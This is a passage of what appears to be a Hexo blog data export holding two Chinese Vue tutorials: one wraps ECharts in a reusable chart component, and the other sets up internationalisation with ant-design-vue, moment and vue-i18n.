class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> random <span class=\"keyword\">from</span> <span class=\"string\">\"lodash/random\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> Chart <span class=\"keyword\">from</span> <span class=\"string\">\"../../components/Chart\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; setInterval, clearInterval &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"timers\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  data() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">      chartOption: &#123;</span><br><span class=\"line\">        title: &#123;</span><br><span class=\"line\">          text: <span class=\"string\">\"ECharts 入门示例\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        tooltip: &#123;&#125;,</span><br><span class=\"line\">        xAxis: &#123;</span><br><span class=\"line\">          data: [<span class=\"string\">\"衬衫\"</span>, <span class=\"string\">\"羊毛衫\"</span>, <span class=\"string\">\"雪纺衫\"</span>, <span class=\"string\">\"裤子\"</span>, <span class=\"string\">\"高跟鞋\"</span>, <span class=\"string\">\"袜子\"</span>]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        yAxis: &#123;&#125;,</span><br><span class=\"line\">        series: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            name: <span class=\"string\">\"销量\"</span>,</span><br><span class=\"line\">            type: <span class=\"string\">\"bar\"</span>,</span><br><span class=\"line\">            data: [<span class=\"number\">5</span>, <span class=\"number\">20</span>, <span class=\"number\">36</span>, <span class=\"number\">10</span>, <span class=\"number\">10</span>, <span class=\"number\">20</span>]</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  mounted() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.interval = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chartOption.series[<span class=\"number\">0</span>].data = <span class=\"keyword\">this</span>.chartOption.series[<span class=\"number\">0</span>].data.map(</span><br><span class=\"line\">        () =&gt; random(<span class=\"number\">100</span>)</span><br><span class=\"line\">      );</span><br><span class=\"line\">      <span class=\"comment\">// 引用类型，重新创建对象才能保证Chart组件中监听option生效</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chartOption = &#123; ...this.chartOption &#125;;</span><br><span class=\"line\">    &#125;, <span class=\"number\">3000</span>);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  beforeDestroy() &#123;</span><br><span class=\"line\">    clearInterval(<span class=\"keyword\">this</span>.interval);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  components: &#123;</span><br><span class=\"line\">    Chart</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>ECharts 是一个流行的成熟的数据图表库，想在 vue 组件中使用，可以使用社区提供的封装好的 vue-eacharts 库，不过还是推荐自己分装，因为简单可靠。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"跑起来\"><a href=\"#跑起来\" class=\"headerlink\" title=\"跑起来\"></a>跑起来</h2><p>根据<a href=\"https://echarts.baidu.com/tutorial.html#%E5%9C%A8%20webpack%20%E4%B8%AD%E4%BD%BF%E7%94%A8%20ECharts\" target=\"_blank\" rel=\"noopener\">官方文档</a>，安装完 echarts 之后，只需简单的创建个组件文件 Chart.vue，然后在 mounted 的时候初始化 echarts 实例，然后在需要的页面注册使用即可使用。</p>\n<h3 id=\"创建-Chart-组件\"><a href=\"#创建-Chart-组件\" class=\"headerlink\" title=\"创建 Chart 组件\"></a>创建 Chart 组件</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"myChart\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> echarts <span class=\"keyword\">from</span> <span class=\"string\">\"echarts\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  mounted() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 基于准备好的dom，初始化echarts实例</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> myChart = echarts.init(<span class=\"keyword\">this</span>.$refs.myChart);</span><br><span class=\"line\">    <span class=\"comment\">// 绘制图表</span></span><br><span class=\"line\">    myChart.setOption(&#123;</span><br><span class=\"line\">      title: &#123;</span><br><span class=\"line\">        text: <span class=\"string\">\"ECharts 入门示例\"</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      tooltip: &#123;&#125;,</span><br><span class=\"line\">      xAxis: &#123;</span><br><span class=\"line\">        data: [<span class=\"string\">\"衬衫\"</span>, <span class=\"string\">\"羊毛衫\"</span>, <span class=\"string\">\"雪纺衫\"</span>, <span class=\"string\">\"裤子\"</span>, <span class=\"string\">\"高跟鞋\"</span>, <span class=\"string\">\"袜子\"</span>]</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      yAxis: &#123;&#125;,</span><br><span class=\"line\">      series: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          name: <span class=\"string\">\"销量\"</span>,</span><br><span class=\"line\">          type: <span class=\"string\">\"bar\"</span>,</span><br><span class=\"line\">          data: [<span class=\"number\">5</span>, <span class=\"number\">20</span>, <span class=\"number\">36</span>, <span class=\"number\">10</span>, <span class=\"number\">10</span>, <span class=\"number\">20</span>]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用-Chart-组件\"><a href=\"#使用-Chart-组件\" class=\"headerlink\" title=\"使用 Chart 组件\"></a>使用 Chart 组件</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">Chart</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height:400px\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Chart <span class=\"keyword\">from</span> <span class=\"string\">\"../../components/Chart\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  components: &#123;</span><br><span class=\"line\">    Chart</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"实际使用\"><a href=\"#实际使用\" class=\"headerlink\" title=\"实际使用\"></a>实际使用</h2><p>需要解决三个问题：一是窗口大小改变的时候图表需要重新渲染；二是引用第三方库需要及时的销毁，访问内存溢出；三是数据应该由父级传入。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> debounce <span class=\"keyword\">from</span> <span class=\"string\">\"lodash/debounce\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> echarts <span class=\"keyword\">from</span> <span class=\"string\">\"echarts\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; addListener, removeListener &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"resize-detector\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  props: &#123;</span><br><span class=\"line\">    option: &#123;</span><br><span class=\"line\">      type: <span class=\"built_in\">Object</span>,</span><br><span class=\"line\">      <span class=\"keyword\">default</span>: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  watch: &#123;</span><br><span class=\"line\">    option(val) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chart.setOption(val);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 深度复制，可以监听到option对象内部属性的变化，但是比较耗性能</span></span><br><span class=\"line\">    <span class=\"comment\">// option: &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//   handler(val) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     this.chart.setOption(val);</span></span><br><span class=\"line\">    <span class=\"comment\">//   &#125;,</span></span><br><span class=\"line\">    <span class=\"comment\">//   deep: true</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  created() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.resize = debounce(<span class=\"keyword\">this</span>.resize, <span class=\"number\">300</span>);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  mounted() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.renderChart();</span><br><span class=\"line\">    <span class=\"comment\">// 监听dom变化，及时重新渲染eacharts实例</span></span><br><span class=\"line\">    addListener(<span class=\"keyword\">this</span>.$refs.myChart, <span class=\"keyword\">this</span>.resize);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  beforeDestroy() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 销毁eacharts实例</span></span><br><span class=\"line\">    removeListener(<span class=\"keyword\">this</span>.$refs.myChart, <span class=\"keyword\">this</span>.resize);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.chart.dispose();</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.chart = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  methods: &#123;</span><br><span class=\"line\">    resize() &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">\"resize\"</span>);</span><br><span class=\"line\">      <span class=\"comment\">// 重新渲染eacharts实例</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chart.resize();</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    renderChart() &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 基于准备好的dom，初始化echarts实例</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chart = echarts.init(<span class=\"keyword\">this</span>.$refs.myChart);</span><br><span class=\"line\">      <span class=\"comment\">// 绘制图表</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chart.setOption(<span class=\"keyword\">this</span>.option);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>调用 Chart 组件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">Chart</span> <span class=\"attr\">:option</span>=<span class=\"string\">\"chartOption\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height: 400px;\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> random <span class=\"keyword\">from</span> <span class=\"string\">\"lodash/random\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> Chart <span class=\"keyword\">from</span> <span class=\"string\">\"../../components/Chart\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; setInterval, clearInterval &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"timers\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  data() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">      chartOption: &#123;</span><br><span class=\"line\">        title: &#123;</span><br><span class=\"line\">          text: <span class=\"string\">\"ECharts 入门示例\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        tooltip: &#123;&#125;,</span><br><span class=\"line\">        xAxis: &#123;</span><br><span class=\"line\">          data: [<span class=\"string\">\"衬衫\"</span>, <span class=\"string\">\"羊毛衫\"</span>, <span class=\"string\">\"雪纺衫\"</span>, <span class=\"string\">\"裤子\"</span>, <span class=\"string\">\"高跟鞋\"</span>, <span class=\"string\">\"袜子\"</span>]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        yAxis: &#123;&#125;,</span><br><span class=\"line\">        series: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            name: <span class=\"string\">\"销量\"</span>,</span><br><span class=\"line\">            type: <span class=\"string\">\"bar\"</span>,</span><br><span class=\"line\">            data: [<span class=\"number\">5</span>, <span class=\"number\">20</span>, <span class=\"number\">36</span>, <span class=\"number\">10</span>, <span class=\"number\">10</span>, <span class=\"number\">20</span>]</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  mounted() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.interval = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chartOption.series[<span class=\"number\">0</span>].data = <span class=\"keyword\">this</span>.chartOption.series[<span class=\"number\">0</span>].data.map(</span><br><span class=\"line\">        () =&gt; random(<span class=\"number\">100</span>)</span><br><span class=\"line\">      );</span><br><span class=\"line\">      <span class=\"comment\">// 引用类型，重新创建对象才能保证Chart组件中监听option生效</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chartOption = &#123; ...this.chartOption &#125;;</span><br><span class=\"line\">    &#125;, <span class=\"number\">3000</span>);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  beforeDestroy() &#123;</span><br><span class=\"line\">    clearInterval(<span class=\"keyword\">this</span>.interval);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  components: &#123;</span><br><span class=\"line\">    Chart</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@国际化","date":"2019-05-28T11:38:25.000Z","updated":"2019-05-28T11:38:25.000Z","_content":"\n# 概述\n\n国际化，包括组件库的国际化、第三库的国际化和本地业务的国际化。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n测试示例效果图：\n![overview](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n## 组件库的国际化\n\n以 ant-design-vue 库为例，针对国际化提供了 LocaleProvider 组件，具体使用如下：\n\n### 全局注册组件\n\n```js\nimport { LocaleProvider } from \"ant-design-vue\";\nVue.use(LocaleProvider);\n```\n\n### App.vue 中使用\n\n```html\n<template>\n  <div id=\"app\">\n    <a-locale-provider :locale=\"locale\">\n      <router-view />\n    </a-locale-provider>\n  </div>\n</template>\n\n<style></style>\n<script>\n  import zh_CN from \"ant-design-vue/lib/locale-provider/zh_CN\";\n  import en_US from \"ant-design-vue/lib/locale-provider/en_US\";\n  export default {\n    data() {\n      return {\n        locale: {\n          type: Object,\n          default: en_US\n        }\n      };\n    },\n    watch: {\n      \"$route.query.locale\": function(val) {\n        this.locale = val === \"en_US\" ? en_US : zh_CN;\n      }\n    }\n  };\n</script>\n```\n\n对于 locale 值的动态获取，本示例是通过路由的 query 实现的。例如本示例：\n\n```html\n<template>\n  <div>\n    <a-layout-header style=\"background: #fff; padding: 0\">\n      <a-dropdown style=\"float:right;margin-right:30px;\">\n        <a class=\"ant-dropdown-link\" href=\"javascript:void(0)\">\n          <a-icon type=\"global\" />\n        </a>\n        <a-menu slot=\"overlay\" @click=\"onClick\">\n          <a-menu-item key=\"zh_CN\">中文</a-menu-item>\n          <a-menu-item key=\"en_US\">English</a-menu-item>\n        </a-menu>\n      </a-dropdown>\n    </a-layout-header>\n  </div>\n</template>\n\n<script>\n  export default {\n    methods: {\n      onClick({ key }) {\n        this.$router.push({ query: { locale: key } });\n      }\n    }\n  };\n</script>\n<style scoped></style>\n```\n\n组件库国际化完成后，测试效果图：\n![效果图](1.jpg)\n\n我们发现日期选择组件中并没有完全国际化，原因就是组件库引用了第三方的 moment 库，而 moment 库有自己的国际化方式，说明见下面“第三方库的国际化”。\n\n## 第三方库的国际化\n\n针对`moment`库的国际化，在上段代码基础上修改如下：\n\n```html\n<!-- src/App.vue -->\n<script>\n  import zh_CN from \"ant-design-vue/lib/locale-provider/zh_CN\";\n  import en_US from \"ant-design-vue/lib/locale-provider/en_US\";\n  import moment from \"moment\";\n  import \"moment/locale/zh-cn\";\n  export default {\n    data() {\n      return {\n        locale: {\n          type: Object,\n          default: en_US\n        }\n      };\n    },\n    watch: {\n      \"$route.query.locale\": function(val) {\n        this.locale = val === \"en_US\" ? en_US : zh_CN;\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n## 本地业务的国际化\n\n推荐用[Vue I18n](https://kazupon.github.io/vue-i18n/)，本次也以该插件为例。\n\n例如上面的效果图，日期选择组件有个 label 的文案“time”，我们对它进行国际化。\n\n首先，本地创建国际化文件，例如：\n\n```js\n// src/local/zhCN.js\nexport default {\n  \"app.dashboard.analysis.timeLabel\": \"时间\"\n};\n```\n\n```js\n// src/local/enUS.js\nexport default {\n  \"app.dashboard.analysis.timeLabel\": \"Time\"\n};\n```\n\n然后，安装相关包文件：\n\n```shell\n# query-string 是方便解析URL查询字符串\nnpm install vue-i18n query-string -S\n```\n\n再然后，在 main.js 中进行注册配置：\n\n```js\n// 引入相关包\nimport VueI18n from \"vue-i18n\";\nimport enUS from \"./locale/enUS\";\nimport zhCN from \"./locale/zhCN\";\nimport queryString from \"query-string\";\n// 注册组件\nVue.use(VueI18n);\n// 创建一个实例\nconst i18n = new VueI18n({\n  locale: queryString.parse(location.search).locale || \"zh_CN\",\n  messages: {\n    zh_CN: { message: zhCN },\n    en_US: { message: enUS }\n  }\n});\n// 挂载到Vue实例\nnew Vue({\n  i18n,\n  router,\n  store,\n  render: h => h(App)\n}).$mount(\"#app\");\n```\n\n最后，在切换语言的地方，添加动态修改 locale：\n\n```js\n  onClick({ key }) {\n    this.$router.push({query: {locale: key}});\n    // 动态修改locale\n    this.$i18n.locale = key;\n  }\n```\n\n最终效果：\n![效果图](2.jpg)\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-i18n.md","raw":"---\ntitle: Vue实战@国际化\npermalink: vue-in-action-i18n\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-28 19:38:25\nupdated: 2019-05-28 19:38:25\n---\n\n# 概述\n\n国际化，包括组件库的国际化、第三库的国际化和本地业务的国际化。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n测试示例效果图：\n![overview](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n## 组件库的国际化\n\n以 ant-design-vue 库为例，针对国际化提供了 LocaleProvider 组件，具体使用如下：\n\n### 全局注册组件\n\n```js\nimport { LocaleProvider } from \"ant-design-vue\";\nVue.use(LocaleProvider);\n```\n\n### App.vue 中使用\n\n```html\n<template>\n  <div id=\"app\">\n    <a-locale-provider :locale=\"locale\">\n      <router-view />\n    </a-locale-provider>\n  </div>\n</template>\n\n<style></style>\n<script>\n  import zh_CN from \"ant-design-vue/lib/locale-provider/zh_CN\";\n  import en_US from \"ant-design-vue/lib/locale-provider/en_US\";\n  export default {\n    data() {\n      return {\n        locale: {\n          type: Object,\n          default: en_US\n        }\n      };\n    },\n    watch: {\n      \"$route.query.locale\": function(val) {\n        this.locale = val === \"en_US\" ? en_US : zh_CN;\n      }\n    }\n  };\n</script>\n```\n\n对于 locale 值的动态获取，本示例是通过路由的 query 实现的。例如本示例：\n\n```html\n<template>\n  <div>\n    <a-layout-header style=\"background: #fff; padding: 0\">\n      <a-dropdown style=\"float:right;margin-right:30px;\">\n        <a class=\"ant-dropdown-link\" href=\"javascript:void(0)\">\n          <a-icon type=\"global\" />\n        </a>\n        <a-menu slot=\"overlay\" @click=\"onClick\">\n          <a-menu-item key=\"zh_CN\">中文</a-menu-item>\n          <a-menu-item key=\"en_US\">English</a-menu-item>\n        </a-menu>\n      </a-dropdown>\n    </a-layout-header>\n  </div>\n</template>\n\n<script>\n  export default {\n    methods: {\n      onClick({ key }) {\n        this.$router.push({ query: { locale: key } });\n      }\n    }\n  };\n</script>\n<style scoped></style>\n```\n\n组件库国际化完成后，测试效果图：\n![效果图](1.jpg)\n\n我们发现日期选择组件中并没有完全国际化，原因就是组件库引用了第三方的 moment 库，而 moment 库有自己的国际化方式，说明见下面“第三方库的国际化”。\n\n## 第三方库的国际化\n\n针对`moment`库的国际化，在上段代码基础上修改如下：\n\n```html\n<!-- src/App.vue -->\n<script>\n  import zh_CN from \"ant-design-vue/lib/locale-provider/zh_CN\";\n  import en_US from \"ant-design-vue/lib/locale-provider/en_US\";\n  import moment from \"moment\";\n  import \"moment/locale/zh-cn\";\n  export default {\n    data() {\n      return {\n        locale: {\n          type: Object,\n          default: en_US\n        }\n      };\n    },\n    watch: {\n      \"$route.query.locale\": function(val) {\n        this.locale = val === \"en_US\" ? en_US : zh_CN;\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n## 本地业务的国际化\n\n推荐用[Vue I18n](https://kazupon.github.io/vue-i18n/)，本次也以该插件为例。\n\n例如上面的效果图，日期选择组件有个 label 的文案“time”，我们对它进行国际化。\n\n首先，本地创建国际化文件，例如：\n\n```js\n// src/local/zhCN.js\nexport default {\n  \"app.dashboard.analysis.timeLabel\": \"时间\"\n};\n```\n\n```js\n// src/local/enUS.js\nexport default {\n  \"app.dashboard.analysis.timeLabel\": \"Time\"\n};\n```\n\n然后，安装相关包文件：\n\n```shell\n# query-string 是方便解析URL查询字符串\nnpm install vue-i18n query-string -S\n```\n\n再然后，在 main.js 中进行注册配置：\n\n```js\n// 引入相关包\nimport VueI18n from \"vue-i18n\";\nimport enUS from \"./locale/enUS\";\nimport zhCN from \"./locale/zhCN\";\nimport queryString from \"query-string\";\n// 注册组件\nVue.use(VueI18n);\n// 创建一个实例\nconst i18n = new VueI18n({\n  locale: queryString.parse(location.search).locale || \"zh_CN\",\n  messages: {\n    zh_CN: { message: zhCN },\n    en_US: { message: enUS }\n  }\n});\n// 挂载到Vue实例\nnew Vue({\n  i18n,\n  router,\n  store,\n  render: h => h(App)\n}).$mount(\"#app\");\n```\n\n最后，在切换语言的地方，添加动态修改 locale：\n\n```js\n  onClick({ key }) {\n    this.$router.push({query: {locale: key}});\n    // 动态修改locale\n    this.$i18n.locale = key;\n  }\n```\n\n最终效果：\n![效果图](2.jpg)\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-i18n","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xp006swovvzsqh56fg","content":"<h1 id=\"概述\"><a href=\"#概述\" 